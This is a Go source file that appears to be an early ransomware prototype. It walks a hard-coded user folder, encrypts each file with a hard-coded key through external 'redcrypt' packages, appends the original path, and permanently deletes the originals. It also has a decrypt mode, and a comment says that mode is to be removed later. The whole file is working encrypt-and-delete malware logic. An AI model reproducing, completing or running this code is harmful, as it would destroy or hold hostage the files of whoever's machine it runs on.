package main

import (
	"fmt"
	"io/fs"
	"os"
	"regexp"

	"github.com/Redhead92/redcrypt"
	"github.com/Redhead92/reddecrypt"
)

const BlockSize = 16

func check (e error){
	if e != nil{
		panic(e)
	}
}

// func keygen() {
// //Use key in smart way to encrypt file
// }

func main() {
	
	testfolder := "C:/Users/super/desktop/test/"
	testkey := "6368616e676520746869732070617373"

	//For testing, remove decryption later
	fmt.Println("Choose Encrypt (E) or Decrypt (D)")
	var input string
	fmt.Scanln(&input)
	
	// Decryption 
	switch input{
	case "D":
		// Folder vars
		var temppath string
		folder := os.DirFS(testfolder)
		// walking system functions
		fs.WalkDir(folder, ".", func(path string, info fs.DirEntry, err error) error{
			check(err)
			temppath = testfolder + path
			fileinfo, err := os.Stat(temppath)
			check(err)

			// skip dirs
			if fileinfo.IsDir(){
				
			}else{
					//Decrypt file into plaintext
					plaintext := string(reddecrypt.Reddecrypt(temppath,testkey))
					//Extract file info
					r := regexp.MustCompile(`(\w{1}\:{1}\/{1}(.*))([\.])(.*)`)
					orFilename := r.FindString(fmt.Sprint(plaintext))
					orFile, err := os.Create(orFilename)
					check(err)
					defer orFile.Close()

					// Delete cipher file
					orFile.Write([]byte(plaintext[:len(plaintext) - len(orFilename)]))
				// Delete files permanently 
					os.Remove(temppath)
					check(err)
				}
			return nil
		})

	case "E":
		// Folder vars
		var temppath string
		folder := os.DirFS(testfolder)
		// walking system functions
		fs.WalkDir(folder, ".", func(path string, info fs.DirEntry, err error) error{
			check(err)
			temppath = testfolder + path
			fileinfo, err := os.Stat(temppath)
			check(err)

			// skip dirs
			if fileinfo.IsDir(){
				
			}else{
					plainFile, err := os.ReadFile(temppath)
					check((err))
					plainFile = append(plainFile, []byte(temppath)...)
				// Encrypt + generate new file
					redcrypt.Redcrypt(testfolder, testkey,[]byte (plainFile)) 
				// Delete files permanently 
					os.Remove(temppath)
					check(err)
				}
			return nil
		})
	
	}

}


